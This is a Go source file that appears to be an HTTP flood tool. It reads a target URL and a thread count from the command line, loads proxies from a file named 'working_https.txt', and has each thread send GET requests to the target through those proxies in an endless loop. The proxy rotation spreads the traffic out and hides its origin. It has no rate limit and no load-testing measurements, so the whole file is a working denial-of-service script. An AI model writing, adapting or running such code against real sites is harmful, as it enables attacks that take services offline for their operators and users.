package main

import (
    "bufio"
    "fmt"
    "net/http"
    "net/url"
    "os"
    "strconv"
    "strings"
    "sync"
    "time"
)

func main() {
    if len(os.Args) < 4 {
        fmt.Println("Usage: ./https <host/url> <threads> <timeout>")
        return
    }

    targetHost := os.Args[1]
    threads, err := strconv.Atoi(os.Args[2])
    if err != nil {
        fmt.Println("Error: Invalid number of threads")
        return
    }

    timeoutSeconds, err := strconv.Atoi(os.Args[3])
    if err != nil {
        fmt.Println("Error: Invalid timeout value")
        return
    }
    timeout := time.Duration(timeoutSeconds) * time.Second

    proxies, err := loadProxies("working_https.txt")
    if err != nil {
        fmt.Println("Error loading proxies:", err)
        return
    }

    var wg sync.WaitGroup
    proxyChannel := make(chan string, len(proxies)) // Use a buffered channel to manage proxies

    // Fill the channel with initial proxies
    for _, proxy := range proxies {
        proxyChannel <- proxy
    }

    // Start goroutines for each thread
    for i := 0; i < threads; i++ {
        wg.Add(1)
        go sendRequests(targetHost, proxyChannel, &wg, timeout)
    }

    wg.Wait()
    close(proxyChannel) // Close the channel after all goroutines are done
    fmt.Println("All requests completed.")
}

func loadProxies(filename string) ([]string, error) {
    file, err := os.Open(filename)
    if err != nil {
        return nil, err
    }
    defer file.Close()

    var proxies []string
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        proxy := strings.TrimSpace(scanner.Text())
        if proxy != "" {
            proxies = append(proxies, proxy)
        }
    }

    if err := scanner.Err(); err != nil {
        return nil, err
    }

    return proxies, nil
}

func sendRequests(targetHost string, proxyChannel chan string, wg *sync.WaitGroup, timeout time.Duration) {
    defer wg.Done()

    for proxy := range proxyChannel {
        for {
            err := makeRequest(targetHost, proxy, timeout)
            if err == nil {
                // Request successful, continue sending requests
                continue
            }

            // Handle errors
            fmt.Printf("Error making request via proxy %s: %s\n", proxy, err)

            // Check for timeout error
            if isTimeoutError(err) {
                fmt.Printf("Timeout making request via proxy %s: %s\n", proxy, err)
            } else {
                // Handle other errors (optional)
                // For example, connection refused
                fmt.Printf("Other error making request via proxy %s: %s\n", proxy, err)
            }

            // Sleep before retrying (optional)
            time.Sleep(1 * time.Second)
        }
    }
}

func makeRequest(targetHost, proxy string, timeout time.Duration) error {
    httpClient := &http.Client{
        Timeout: timeout,
        Transport: &http.Transport{
            Proxy: http.ProxyURL(makeProxyURL(proxy)),
        },
    }

    req, err := http.NewRequest("GET", targetHost, nil)
    if err != nil {
        return err
    }

    resp, err := httpClient.Do(req)
    if err != nil {
        return err
    }

    fmt.Printf("Proxy %s - Status: %s\n", proxy, resp.Status)
    resp.Body.Close()
    return nil
}

func makeProxyURL(proxy string) *url.URL {
    proxyURL, _ := url.Parse("http://" + proxy)
    return proxyURL
}

func isTimeoutError(err error) bool {
    if err, ok := err.(*url.Error); ok {
        if err.Timeout() {
            return true
        }
    }
    return false
}
